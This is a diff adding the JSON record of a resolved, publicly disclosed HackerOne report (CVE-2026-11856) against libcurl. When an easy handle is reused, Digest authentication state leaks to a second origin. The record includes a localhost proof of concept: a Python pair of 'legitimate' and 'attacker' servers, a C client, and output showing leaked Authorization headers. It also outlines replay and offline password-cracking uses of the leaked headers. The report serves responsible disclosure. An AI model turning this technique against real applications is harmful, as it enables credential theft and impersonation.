@@ -1,0 +1,113 @@
+{
+  "id": 3793260,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzkzMjYw",
+  "url": "https://hackerone.com/reports/3793260",
+  "title": "CVE-2026-11856: cross-origin Digest auth state leak",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-10T05:00:51.031Z",
+  "submitted_at": "2026-06-10T05:00:51.852Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jjchuck",
+    "url": "/jjchuck",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-11856"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T06:21:56.814Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:14:31.544Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThis issue is the HTTP sibling to the previously disclosed RTSP Digest auth leak. When an application uses libcurl and reuses the same easy handle for sequential transfers (the documented best practice), the Digest authentication state captured from the first origin is silently sent to the next origin. This occurs because `Curl_pretransfer()` drops the `initial_origin` but fails to clear `data->state.digest` between `curl_easy_perform()` calls. Unlike recently fixed sibling bugs, this leak does not require redirects (`-L`), `.netrc`, proxies, or OAuth bearers. Furthermore, explicitly changing credentials via `CURLOPT_USERPWD` between calls does not prevent the leak, as the new user's password hash is still sent under the previous server's realm and nonce.\n\n## Affected version\nReproduced on stock curl 8.7.1 and current master 8.21.0-DEV (`81cdf4d`), macOS arm64. Backend (SecureTransport/OpenSSL) is irrelevant.\nPlease note that the curl command-line tool is not affected — it calls `curl_easy_reset()` between transfers. This bug is in libcurl as used by applications that reuse easy handles. As of master 81cdf4d, no open PR or issue addresses this; the closest fixes (`6daf4bc7e2` redirect; `c1cfdf59ac` proxy) only cover their respective trigger paths.\n\n## Steps To Reproduce:\nThe PoC sets up a legitimate server (`:19001`) that challenges the client, and an attacker server (`:19002`) that does nothing but log received headers.\n\n1. Servers (`digest_servers.py`)\n```python\n#!/usr/bin/env python3\nimport http.server, threading, sys\n\nclass Legitimate(http.server.BaseHTTPRequestHandler):\n    challenge = ('Digest realm=\"legit-api@example.com\",'\n                 ' nonce=\"LEGIT-NONCE-7c3f0e1d\", opaque=\"LEGIT-OPAQUE\",'\n                 ' qop=\"auth\", algorithm=MD5')\n    def do_GET(self):\n        auth = self.headers.get('Authorization')\n        if not auth:\n            self.send_response(401)\n            self.send_header('WWW-Authenticate', self.challenge)\n            self.send_header('Content-Length', '0'); self.end_headers(); return\n        sys.stdout.write(f\"[LEGITIMATE:19001] {self.path}\\n    auth={auth}\\n\"); sys.stdout.flush()\n        self.send_response(200); self.send_header('Content-Length','0'); self.end_headers()\n    def log_message(self, *a, **k): pass\n\nclass Attacker(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        auth = self.headers.get('Authorization', '<<NO AUTH>>')\n        sys.stdout.write(f\"[ATTACKER:19002]   {self.path}\\n    auth={auth}\\n\"); sys.stdout.flush()\n        self.send_response(200); self.send_header('Content-Length','0'); self.end_headers()\n    def log_message(self, *a, **k): pass\n\ndef run(p, c): http.server.HTTPServer(('127.0.0.1', p), c).serve_forever()\n\nthreading.Thread(target=run, args=(19001, Legitimate), daemon=True).start()\nthreading.Thread(target=run, args=(19002, Attacker),   daemon=True).start()\nimport time; time.sleep(0.4); print(\"up\", flush=True)\nwhile True: time.sleep(60)\n```\n2. Client (`digest_poc.c`)\n\n```c\n#include <stdio.h>\n#include <curl/curl.h>\n\nstatic size_t devnull(char *p, size_t s, size_t n, void *u) {\n    (void)p; (void)u; return s * n;\n}\n\nint main(void) {\n    CURL *c = curl_easy_init();\n    curl_easy_setopt(c, CURLOPT_HTTPAUTH, CURLAUTH_DIGEST);\n    curl_easy_setopt(c, CURLOPT_USERPWD, \"alice:bond\");\n    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, devnull);\n\n    /* Phase 1: Normal API call */\n    curl_easy_setopt(c, CURLOPT_URL, \"http://127.0.0.1:19001/api/me\");\n    curl_easy_perform(c);\n\n    /* Phase 2: Secondary request to attacker URL */\n    curl_easy_setopt(c, CURLOPT_URL, \"http://127.0.0.1:19002/hook\");\n    curl_easy_perform(c);\n\n    /* Phase 3: Processing a different user on the same handle still leaks */\n    curl_easy_setopt(c, CURLOPT_USERPWD, \"bob:secret\");\n    curl_easy_setopt(c, CURLOPT_URL, \"http://127.0.0.1:19002/hook\");\n    curl_easy_perform(c);\n\n    curl_easy_cleanup(c);\n    return 0;\n}\n```\n3. Output\n\n```text\n[LEGITIMATE:19001] /api/me\n    auth=Digest username=\"alice\", realm=\"legit-api@example.com\",\n         nonce=\"LEGIT-NONCE-7c3f0e1d\", uri=\"/api/me\", cnonce=\"6sNdpZj9k+2dGcxj\",\n         nc=00000001, qop=auth, response=\"d0f78adb32ba56a7f18b230fbe49ca3c\",\n         opaque=\"LEGIT-OPAQUE\", algorithm=MD5\n\n[ATTACKER:19002]   /hook\n    auth=Digest username=\"alice\", realm=\"legit-api@example.com\",\n         nonce=\"LEGIT-NONCE-7c3f0e1d\", uri=\"/hook\", cnonce=\"6sNdpZj9k+2dGcxj\",\n         nc=00000002, qop=auth, response=\"9c85cd807d6e52bfdc8f2a2c09420fea\",\n         opaque=\"LEGIT-OPAQUE\", algorithm=MD5\n\n[ATTACKER:19002]   /hook\n    auth=Digest username=\"bob\", realm=\"legit-api@example.com\",\n         nonce=\"LEGIT-NONCE-7c3f0e1d\", uri=\"/hook\", cnonce=\"6sNdpZj9k+2dGcxj\",\n         nc=00000003, qop=auth, response=\"d6776337f455e7e590120439cc8c74a2\",\n         opaque=\"LEGIT-OPAQUE\", algorithm=MD5\n```\nNotice two key findings here:\n1. `nc` increments globally, proving the in-memory state is carried over boundaries without cleanup.\n2. Phase 3 demonstrates that this bug is completely decoupled from the handle's configured credentials: explicitly changing `CURLOPT_USERPWD` to a new user (`bob`) still leaks the *new* user's password hash under the *old* server's realm and nonce.\n\n*(Note: This is separate from the `domain=` known bug (RFC 7616). Even without `domain=` directives, the default RFC protection space explicitly excludes different origins. Therefore, this cross-origin exposure is an independent violation of the default protection space, regardless of whether `domain=` parsing is implemented.)*\n\n\n\n## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.\nConfirmed.\n\n## Impact\n\n## Summary:\nThe scenario:\n1. An application uses libcurl to authenticate to its legitimate API server. The server issues a real Digest challenge, and the client successfully authenticates.\n2. The application then reuses the same easy handle to fetch a secondary URL (e.g., following a webhook, unfurling a link, fetching an external asset, or processing a user-supplied URL). This secondary URL points to an attacker-controlled server.\n\nThe attacker does not need to issue any challenge. They simply receive a fully-formed Digest `Authorization` header originally computed for the legitimate server.\n\nWith this leaked header, the attacker gains two immediate primitives:\n1. Same-URI Replay: The attacker can replay the exact header to the legitimate server within the nonce lifetime. This allows them to impersonate the user and trigger the exact same request (e.g., repeating a `POST` state change or fetching a sensitive `GET` response).\n2. Offline Password Cracking: The attacker can perform an offline dictionary attack against the user's password. The leaked header contains everything needed (`nonce`, `cnonce`, `nc`, `qop`, URI, method, and the response digest) to test candidate passwords against the legitimate realm, since the core secret is `HA1 = MD5(user:realm:password)`.",
+  "weakness": {
+    "id": 113,
+    "name": "Information Exposure Through Sent Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
